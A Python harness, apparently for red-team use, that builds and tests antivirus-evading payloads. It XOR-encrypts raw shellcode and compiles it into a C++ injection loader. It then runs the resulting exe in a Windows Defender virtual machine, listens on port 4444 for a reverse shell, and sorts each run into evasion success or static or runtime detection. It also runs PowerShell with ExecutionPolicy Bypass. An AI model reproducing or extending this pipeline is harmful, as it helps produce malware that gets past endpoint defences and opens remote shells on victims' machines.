import subprocess
import os
import random
import string
import time
import threading
import socket
import logging

# Cấu hình logging để xem output rõ ràng hơn
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] - %(message)s')

# --- CONFIGURATION ---
# Cập nhật thông tin máy ảo của bạn ở đây
VMS_CONFIG = {
    "Windows Defender": {
        "vmx_path": r"C:\Users\Duy\Documents\Virtual_Machines\Windows_11_01.vmx", # THAY ĐỔI ĐƯỜNG DẪN NÀY
        "user": "test",
        "pass": "test",
        "log_collector_host": "./log_collectors/collect_defender.ps1"
    },
    # Thêm các máy ảo khác vào đây
    # "Bitdefender": {
    #     "vmx_path": r"D:\VMs\Win11_Bitdefender\Win11_Bitdefender.vmx",
    #     "user": "test",
    #     "pass": "test"
    # },
}
CLEAN_SNAPSHOT_NAME = "clean_snapshot"

# Cấu hình đường dẫn trên Guest VM
GUEST_DESKTOP = r"C:\Users\test\Desktop" # Thay "test" bằng username trong VM nếu khác
GUEST_PAYLOAD_PATH = os.path.join(GUEST_DESKTOP, "payload.exe")
GUEST_LOG_COLLECTOR = os.path.join(GUEST_DESKTOP, "collect_logs.ps1")
GUEST_LOG_OUTPUT = os.path.join(GUEST_DESKTOP, "detection_log.txt")

# Cấu hình C2 Listener
LISTENER_IP = "192.168.142.1" # THAY ĐỔI BẰNG IP CỦA MÁY HOST
LISTENER_PORT = 4444

# Biến toàn cục để listener thread cập nhật
connection_received = False

def wait_for_vm_ready(vm_info, timeout=120):
    """
    Periodically checks if the VM is ready by trying to list processes.
    Returns True if ready, False if timeout is reached.
    """
    start_time = time.time()
    while time.time() - start_time < timeout:
        logging.info("Pinging VM to check for readiness...")
        # Lệnh "listProcessesInGuest" là một cách "ping" VMware Tools hoàn hảo
        check_cmd = ["vmrun", "-gu", vm_info["user"], "-gp", vm_info["pass"], "listProcessesInGuest", vm_info["vmx_path"]]
        
        # Chúng ta không muốn in lỗi ra màn hình mỗi lần ping thất bại
        try:
            subprocess.run(check_cmd, check=True, capture_output=True, text=True, timeout=10)
            logging.info("VM is ready!")
            return True
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
            time.sleep(5) # Chờ 5 giây trước khi thử lại
    
    logging.error("Timeout reached while waiting for VM to become ready.")
    return False

def collect_guest_logs(vm_name, vm_info):
    """
    Consolidates the logic for collecting logs from a guest VM.
    Returns the log content as a string.
    """
    # collector_script_on_host = vm_info.get("log_collector_host")
    # if not (collector_script_on_host and os.path.exists(collector_script_on_host)):
    #     return f"Log collector script not found or not defined for {vm_name}."

    # logging.info(f"Deploying log collector: {collector_script_on_host}")
    # run_command(["vmrun", "-gu", vm_info["user"], "-gp", vm_info["pass"], "copyFileToGuest", vm_info["vmx_path"], collector_script_on_host, GUEST_LOG_COLLECTOR])
    
    run_command(["vmrun", "-gu", vm_info["user"], "-gp", vm_info["pass"], "runProgramInGuest", vm_info["vmx_path"], "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-ExecutionPolicy", "Bypass", "-File", GUEST_LOG_COLLECTOR])
    time.sleep(10)
    
    host_log_path = os.path.join("test_logs", f"log_{vm_name.replace(' ', '_')}_{int(time.time())}.txt")
    if run_command(["vmrun", "-gu", vm_info["user"], "-gp", vm_info["pass"], "copyFileFromGuestToHost", vm_info["vmx_path"], GUEST_LOG_OUTPUT, host_log_path]):
        try:
            with open(host_log_path, 'r', encoding='utf-8') as f:
                return f.read()
        except Exception as e:
            return f"Error reading log file: {e}"
    else:
        return "Failed to copy log file from guest."

def run_command(cmd_list):
    """Hàm tiện ích để chạy lệnh và trả về True/False."""
    logging.info(f"Executing: {' '.join(cmd_list)}")
    try:
        # Tăng timeout cho các lệnh có thể chạy lâu
        subprocess.run(cmd_list, check=True, capture_output=True, text=True, timeout=120)
        return True
    except subprocess.TimeoutExpired:
        logging.error("Command timed out!")
        return False
    except subprocess.CalledProcessError as e:
        logging.error(f"Command failed: {e.stderr}")
        return False
    except FileNotFoundError:
        logging.error(f"Command not found: {cmd_list[0]}. Is it in your PATH?")
        return False

def build_payload(shellcode_path, build_options):
    """
    Hợp nhất logic từ builder.py cũ.
    Nhận đường dẫn shellcode và các tùy chọn, trả về đường dẫn của payload đã build.
    """
    logging.info(f"Starting payload build with options: {build_options}")
    
    # 1. Đọc shellcode
    try:
        with open(shellcode_path, 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        logging.error(f"Shellcode file not found at {shellcode_path}")
        return None

    # 2. Mã hóa (hiện tại chỉ có XOR)
    key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    if build_options.get('encryption') == 'xor':
        logging.info(f"Encrypting with XOR using key: {key}")
        encoded_shellcode = bytearray(byte ^ ord(key[i % len(key)]) for i, byte in enumerate(shellcode))
        shellcode_to_embed = encoded_shellcode
    else: # none
        shellcode_to_embed = shellcode

    # 3. Tạo mã nguồn C++
    try:
        with open('src/main.cpp', 'r') as f:
            template = f.read()
    except FileNotFoundError:
        logging.error("Source code template 'src/main.cpp' not found.")
        return None

    defines = []
    if build_options.get('encryption') == 'xor':
        defines.append("#define ENCRYPTION_XOR")
    if build_options.get('injection') == 'classic':
        defines.append("#define INJECTION_CLASSIC")
    if build_options.get('debug'):
        defines.append("#define DEBUG_MODE")

    formatted_shellcode = "{" + ", ".join([f"0x{byte:02x}" for byte in shellcode_to_embed]) + "};"
    
    code = template.replace("/*{{DEFINES}}*/", "\n".join(defines))
    code = code.replace("/*{{SHELLCODE}}*/", formatted_shellcode)
    code = code.replace("/*{{SHELLCODE_LEN}}*/", str(len(shellcode_to_embed)))
    code = code.replace("/*{{KEY}}*/", f'"{key}"')

    source_file = 'build/generated_loader.cpp'
    with open(source_file, 'w') as f:
        f.write(code)

    # 4. Biên dịch
    output_filename = f"payload_{int(time.time())}.exe"
    if not run_command(["make", "build", f"SRC={os.path.basename(source_file)}", f"OUT={output_filename}"]):
        logging.error("Compilation failed. Check Makefile and MinGW setup.")
        return None
    
    final_payload_path = os.path.join("output", output_filename)
    logging.info(f"Payload built successfully: {final_payload_path}")
    return final_payload_path

def c2_listener():
    """Lắng nghe kết nối reverse shell."""
    global connection_received
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind((LISTENER_IP, LISTENER_PORT))
        sock.listen(1)
        logging.info(f"[C2] Listening on {LISTENER_IP}:{LISTENER_PORT}...")
        sock.settimeout(30) # Chờ tối đa 30 giây cho kết nối
        conn, addr = sock.accept()
        logging.info(f"[C2] SUCCESS! Connection received from {addr}")
        connection_received = True
        conn.close()
    except socket.timeout:
        logging.warning("[C2] FAILED! No connection received within timeout.")
    except Exception as e:
        logging.error(f"[C2] Listener error: {e}")
    finally:
        sock.close()

def run_single_test(vm_name, payload_path, build_options):
    global connection_received
    connection_received = False
    
    vm_info = VMS_CONFIG.get(vm_name)
    if not vm_info:
        return {"status": "ERROR", "log": f"VM '{vm_name}' not found in configuration."}

    logging.info(f"--- Starting test on: {vm_name} ---")
    
    # 1. Revert & Start VM
    if not run_command(["vmrun", "revertToSnapshot", vm_info["vmx_path"], CLEAN_SNAPSHOT_NAME]): return {"status": "FAILED", "log": "Failed to revert snapshot."}
    if not run_command(["vmrun", "-T", "ws", "start", vm_info["vmx_path"], "nogui"]): return {"status": "FAILED", "log": "Failed to start VM."}

    # 2. Chờ VM sẵn sàng (sẽ thêm logic kiểm tra ở đây)
    logging.info("Waiting for VMware Tools to be ready (up to 120 seconds)...")
    if not wait_for_vm_ready(vm_info, timeout=120):
        run_command(["vmrun", "stop", vm_info["vmx_path"]])
        return {"status": "FAILED", "log": "VM did not become ready (VMware Tools timeout)."}

    # 3. Deploy

    collector_script_on_host = vm_info.get("log_collector_host")
    if not (collector_script_on_host and os.path.exists(collector_script_on_host)):
        return f"Log collector script not found or not defined for {vm_name}."

    logging.info(f"Deploying log collector: {collector_script_on_host}")
    if not run_command(["vmrun", "-gu", vm_info["user"], "-gp", vm_info["pass"], "copyFileFromHostToGuest", vm_info["vmx_path"], collector_script_on_host, GUEST_LOG_COLLECTOR]):
        # Lỗi copy file thường là do môi trường, không phải do AV, nên không cần lấy log
        run_command(["vmrun", "stop", vm_info["vmx_path"]])
        return {"status": "FAILED", "log": "Failed to copy collector script to guest. Check VMware Tools and user credentials."}


    if not run_command(["vmrun", "-gu", vm_info["user"], "-gp", vm_info["pass"], "copyFileFromHostToGuest", vm_info["vmx_path"], payload_path, GUEST_PAYLOAD_PATH]):
        logging.info("[WARNING] Failed to copy payload to guest. Potentially being statically scanned.")
    
    # 4. Start C2 Listener
    listener_thread = threading.Thread(target=c2_listener)
    listener_thread.start()
    time.sleep(7)
    
    # 5. Execute
    execute_success = run_command(["vmrun", "-gu", vm_info["user"], "-gp", vm_info["pass"], "runProgramInGuest", vm_info["vmx_path"], "-noWait", GUEST_PAYLOAD_PATH])
    
    # 6. Wait for result from listener
    listener_thread.join()

    # 7. Phân tích kết quả và Thu thập Log
    log_details = "N/A"
    result_status = "UNKNOWN"
    
    if connection_received:
        result_status = "SUCCESS"
        log_details = "Reverse shell connection established."
    else: # Connection failed
        if not execute_success:
            # Lỗi thực thi -> Rất có thể do Static Detection!
            result_status = "FAILED (Static Detection?)"
            log_details = "Execution failed. Payload might have been deleted on arrival."
        else:
            # Thực thi thành công nhưng không có shell -> Lỗi Runtime Detection
            result_status = "FAILED (Runtime Detection?)"
            log_details = "Execution succeeded, but no shell received. Payload was likely blocked during runtime."

        # TRONG MỌI TRƯỜNG HỢP THẤT BẠI, HÃY CỐ GẮNG THU THẬP LOG
        logging.info(f"Test failed ({result_status}).")

    logging.info("Collecting logs...")    
    log_details += "\n\n" + collect_guest_logs(vm_name, vm_info) # Gọi hàm thu thập log mới

    # 8. Cleanup
    logging.info("Stopping VM...")
    run_command(["vmrun", "stop", vm_info["vmx_path"]])
    time.sleep(10)

    return {"status": result_status, "log": log_details}